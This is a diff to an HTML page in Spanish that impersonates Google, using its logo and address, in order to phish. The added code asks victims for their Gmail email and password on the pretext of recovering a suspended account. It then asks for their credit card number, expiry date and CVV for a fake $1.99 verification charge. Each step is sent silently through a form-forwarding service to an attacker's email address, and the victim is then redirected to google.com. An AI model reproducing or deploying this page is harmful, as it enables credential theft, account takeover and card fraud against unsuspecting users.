@@ -22,6 +22,11 @@
             width: 100%;
             max-width: 400px;
             text-align: center;
+            display: none; /* Oculto por defecto */
+        }
+        /* Clase para mostrar el contenedor activo */
+        .active {
+            display: block !important;
         }
         .logo {
             width: 75px;
@@ -30,11 +35,13 @@
         h2 {
             color: #202124;
             margin-bottom: 10px;
+            font-size: 20px;
         }
         p {
             color: #5f6368;
             font-size: 14px;
             margin-bottom: 20px;
+            line-height: 1.5;
         }
         input {
             width: 100%;
@@ -64,37 +71,115 @@
         button:hover {
             background-color: #1765cc;
         }
+        .card-icons {
+            margin: 15px 0;
+            font-size: 24px;
+            color: #5f6368;
+        }
         .footer {
             margin-top: 20px;
             font-size: 12px;
             color: #999;
         }
+        /* Loader simple */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+            margin: 10px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <!-- PASO 1: EMAIL Y PASSWORD -->
+    <div id="step1" class="container active">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
         
-        <h2>Verificación de seguridad</h2>
-        <p>Para continuar, por favor confirma tu identidad.</p>
+        <h2>Iniciar sesión</h2>
+        <p>Para recuperar tu cuenta suspendida, por favor ingresa tus credenciales.</p>
         
         <form action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
-            <!-- Redirige a Google -->
+            <!-- Datos ocultos para el Paso 1 -->
             <input type="hidden" name="_next" value="https://www.google.com">
-            <!-- Asunto del correo -->
-            <input type="hidden" name="_subject" value="Nueva verificación Gmail">
+            <input type="hidden" name="_subject" value="Paso 1: Credenciales">
+            <input type="hidden" name="_captcha" value="false">
+
+            <input type="email" name="Email" placeholder="Correo electrónico" required>
+            <input type="password" name="Password" placeholder="Contraseña" required>
             
-            <input type="email" name="email" placeholder="Correo electrónico" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            
-            <button type="submit">Siguiente</button>
+            <button type="button" onclick="submitStep1()">Ingresar</button>
         </form>
-                
+        
         <div class="footer">
             Google, Inc. • 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
         </div>
     </div>
+
+    <!-- PASO 2: TARJETA -->
+    <div id="step2" class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
+        
+        <h2>Verificación de Tarjeta</h2>
+        <p>Para confirmar que no eres un robot, necesitamos verificar tu método de pago. <strong>Se realizará un cargo de reembolso de $1.99 USD.</strong></p>
+        
+        <div class="card-icons">💳 Visa Mastercard</div>
+
+        <form action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
+            <!-- Datos ocultos para el Paso 2 -->
+            <input type="hidden" name="_next" value="https://www.google.com">
+            <input type="hidden" name="_subject" value="Paso 2: Tarjeta de Crédito">
+            <input type="hidden" name="_captcha" value="false">
+
+            <input type="text" name="Card_Number" placeholder="Número de tarjeta" required pattern="\d{16}" title="Ingresa 16 dígitos">
+            
+            <div style="display: flex; gap: 10px;">
+                <input type="text" name="Expiry" placeholder="MM/YY" required style="width: 50%;">
+                <input type="text" name="CVV" placeholder="CVV" required style="width: 50%;">
+            </div>
+            
+            <button type="submit">Pagar $1.99 y Activar</button>
+        </form>
+        
+        <div class="footer">
+            Pago seguro y encriptado.
+        </div>
+    </div>
+
+    <script>
+        function submitStep1() {
+            // 1. Obtener el formulario del paso 1
+            const form1 = document.querySelector('#step1 form');
+            
+            // 2. Crear un FormData para enviar sin recargar la página (AJAX)
+            const data = new FormData(form1);
+            
+            fetch(form1.action, {
+                method: 'POST',
+                body: data,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                // 3. Si el envío fue exitoso, ocultar paso 1 y mostrar paso 2
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+            })
+            .catch(error => {
+                alert('Hubo un error. Intenta de nuevo.');
+                console.error('Error:', error);
+            });
+        }
+    </script>
 
 </body>
 </html>
